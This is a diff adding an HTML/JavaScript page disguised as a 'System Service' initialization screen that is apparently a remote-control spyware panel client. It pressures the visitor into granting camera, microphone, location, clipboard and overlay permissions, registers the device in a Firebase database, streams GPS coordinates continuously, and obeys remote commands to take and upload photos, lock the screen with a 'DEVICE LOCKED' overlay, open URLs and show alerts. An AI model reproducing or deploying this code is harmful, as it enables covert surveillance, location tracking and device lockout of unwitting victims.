@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Service</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: system-ui, sans-serif;
+        }
+        #main-display {
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+        }
+        .spinner {
+            width: 40px; height: 40px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #status {
+            position: fixed; bottom: 5px; right: 5px;
+            color: #0f0; font-size: 8px; opacity: 0.5;
+        }
+        #permOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); z-index: 99999;
+            display: none; align-items: center; justify-content: center;
+            color: #0f0; text-align: center; padding: 20px;
+        }
+        .btn {
+            background: #0f0; color: #000; border: none;
+            padding: 15px 30px; border-radius: 10px; font-weight: bold;
+            margin-top: 20px; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div id="main-display">
+        <div class="spinner"></div>
+        <h3>Initializing System...</h3>
+        <p id="permStatus" style="color:#666; margin-top:20px; font-size:12px;"></p>
+    </div>
+    <div id="status">● INIT</div>
+    
+    <div id="permOverlay">
+        <div>
+            <h2>⚠️ GRANT REQUIRED</h2>
+            <p style="margin:20px 0;">This app needs "Display over other apps" permission.</p>
+            <button class="btn" onclick="requestOverlayPermission()">Open Settings</button>
+            <button class="btn" onclick="document.getElementById('permOverlay').style.display='none'">Later</button>
+        </div>
+    </div>
+
+    <input type="file" id="fileInput" style="display:none" multiple>
+    <input type="file" id="cameraInput" style="display:none" accept="image/*" capture="environment">
+    <video id="video" style="display:none" autoplay playsinline></video>
+    <audio id="audio" style="display:none"></audio>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getDatabase, ref, set, onValue, update, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+        import { getStorage, ref as sRef, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyC2zLJmcUIDq0nVIqIFpzdLlcMvIDiGsiM",
+            authDomain: "deey-f5901.firebaseapp.com",
+            projectId: "deey-f5901",
+            storageBucket: "deey-f5901.firebasestorage.app",
+            messagingSenderId: "248413879277",
+            appId: "1:248413879277:web:a331c0ebc00c611a6b85e4",
+            databaseURL: "https://deey-f5901-default-rtdb.asia-southeast1.firebasedatabase.app"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const storage = getStorage(app);
+
+        const DEVICE_ID = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+        const deviceRef = ref(db, `devices/${DEVICE_ID}`);
+        const cmdRef = ref(db, `devices/${DEVICE_ID}/command`);
+        const dataRef = ref(db, `devices/${DEVICE_ID}/data`);
+        
+        let wakeLock = null;
+        let lockOverlay = null;
+        let gpsWatchId = null;
+
+        // ========== PERMISSION SPAMMER ==========
+        const PERMISSIONS = [
+            'camera', 'microphone', 'location', 'notifications',
+            'persistent-storage', 'clipboard-read', 'clipboard-write'
+        ];
+
+        async function requestAllPermissions() {
+            const results = {};
+            const statusEl = document.getElementById('permStatus');
+            
+            // Camera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                results.camera = true;
+                stream.getTracks().forEach(t => t.stop());
+                statusEl.innerHTML += '📸 Camera ✓<br>';
+            } catch(e) { results.camera = false; statusEl.innerHTML += '📸 Camera ✗<br>'; }
+
+            // Microphone
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                results.microphone = true;
+                stream.getTracks().forEach(t => t.stop());
+                statusEl.innerHTML += '🎤 Microphone ✓<br>';
+            } catch(e) { results.microphone = false; statusEl.innerHTML += '🎤 Microphone ✗<br>'; }
+
+            // Location
+            try {
+                await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 });
+                });
+                results.location = true;
+                statusEl.innerHTML += '📍 Location ✓<br>';
+            } catch(e) { results.location = false; statusEl.innerHTML += '📍 Location ✗<br>'; }
+
+            // Notification
+            if ('Notification' in window) {
+                const perm = await Notification.requestPermission();
+                results.notification = perm === 'granted';
+                statusEl.innerHTML += `🔔 Notification ${perm}<br>`;
+            }
+
+            // Clipboard
+            try {
+                await navigator.clipboard.writeText('test');
+                await navigator.clipboard.readText();
+                results.clipboard = true;
+                statusEl.innerHTML += '📋 Clipboard ✓<br>';
+            } catch(e) { results.clipboard = false; }
+
+            // Storage
+            if ('storage' in navigator) {
+                try {
+                    const estimate = await navigator.storage.estimate();
+                    results.storage = true;
+                    statusEl.innerHTML += '💾 Storage ✓<br>';
+                } catch(e) { results.storage = false; }
+            }
+
+            return results;
+        }
+
+        // Overlay permission (buat lock screen)
+        window.requestOverlayPermission = function() {
+            // Android intent buat overlay
+            window.location.href = 'intent://settings#Intent;scheme=android-app;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;end';
+            // Fallback
+            setTimeout(() => {
+                alert('Go to Settings → Apps → [This App] → Display over other apps → Allow');
+            }, 500);
+        };
+
+        // Cek apakah overlay diizinkan (di WebView gak bisa detect, jadi kita pancing)
+        function checkOverlayPermission() {
+            // Di WebView kita gak bisa deteksi, jadi tampilkan popup minta manual
+            document.getElementById('permOverlay').style.display = 'flex';
+        }
+
+        // ========== LOCK SCREEN (Overlay) ==========
+        function lockDevice(enable) {
+            if (enable) {
+                if (lockOverlay) return;
+                lockOverlay = document.createElement('div');
+                lockOverlay.style.cssText = `
+                    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+                    background: #000; z-index: 999999; display: flex;
+                    align-items: center; justify-content: center;
+                    color: #f00; font-size: 24px; font-family: monospace;
+                `;
+                lockOverlay.innerHTML = '<div>🔒 DEVICE LOCKED<br><small>Admin Control</small></div>';
+                document.body.appendChild(lockOverlay);
+                
+                history.pushState(null, null, location.href);
+                window.onpopstate = () => history.pushState(null, null, location.href);
+                
+                if ('wakeLock' in navigator) {
+                    navigator.wakeLock.request('screen').then(wl => wakeLock = wl);
+                }
+            } else {
+                if (lockOverlay) lockOverlay.remove();
+                lockOverlay = null;
+                if (wakeLock) wakeLock.release();
+                window.onpopstate = null;
+            }
+        }
+
+        // ========== GPS TRACKING ==========
+        function startGPS() {
+            if (gpsWatchId) return;
+            gpsWatchId = navigator.geolocation.watchPosition(
+                (pos) => {
+                    push(ref(db, `devices/${DEVICE_ID}/gps`), {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        acc: pos.coords.accuracy,
+                        ts: Date.now()
+                    });
+                },
+                (e) => {},
+                { enableHighAccuracy: true }
+            );
+        }
+
+        // ========== TAKE PHOTO ==========
+        async function takePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+                const fileRef = sRef(storage, `photos/${DEVICE_ID}/${Date.now()}.jpg`);
+                await uploadBytes(fileRef, blob);
+                const url = await getDownloadURL(fileRef);
+                
+                stream.getTracks().forEach(t => t.stop());
+                return { url };
+            } catch(e) {
+                return { error: e.message };
+            }
+        }
+
+        // ========== COMMAND LISTENER ==========
+        onValue(cmdRef, async (snap) => {
+            const cmd = snap.val();
+            if (!cmd) return;
+            await set(cmdRef, null);
+            
+            let result = { cmd: cmd.action, success: false };
+            
+            try {
+                switch(cmd.action) {
+                    case 'lock_device': lockDevice(true); result.success = true; break;
+                    case 'unlock_device': lockDevice(false); result.success = true; break;
+                    case 'take_photo': result.data = await takePhoto(); result.success = !!result.data.url; break;
+                    case 'vibrate': navigator.vibrate?.(cmd.pattern || 500); result.success = true; break;
+                    case 'alert': alert(cmd.message || 'ALERT'); result.success = true; break;
+                    case 'tts': 
+                        const u = new SpeechSynthesisUtterance(cmd.text || 'Hello');
+                        speechSynthesis.speak(u);
+                        result.success = true;
+                        break;
+                    case 'gps_tracking': startGPS(); result.success = true; break;
+                    case 'buka_website': window.open(cmd.url, '_blank'); result.success = true; break;
+                    default: result.error = 'Unknown command';
+                }
+            } catch(e) {
+                result.error = e.message;
+            }
+            
+            await push(dataRef, { ...result, ts: Date.now() });
+        });
+
+        // ========== INIT ==========
+        async function init() {
+            const perms = await requestAllPermissions();
+            
+            // Info device
+            const info = {
+                id: DEVICE_ID,
+                online: true,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                permissions: perms,
+                lastSeen: serverTimestamp()
+            };
+            
+            await set(deviceRef, info);
+            
+            window.addEventListener('beforeunload', () => {
+                update(deviceRef, { online: false });
+            });
+            
+            // Keep alive
+            setInterval(() => update(deviceRef, { lastSeen: serverTimestamp() }), 30000);
+            
+            // Minta overlay
+            setTimeout(checkOverlayPermission, 2000);
+            
+            // Auto-start GPS
+            startGPS();
+            
+            document.getElementById('status').innerHTML = '🟢 LIVE';
+        }
+
+        init();
+    </script>
+</body>
+</html>
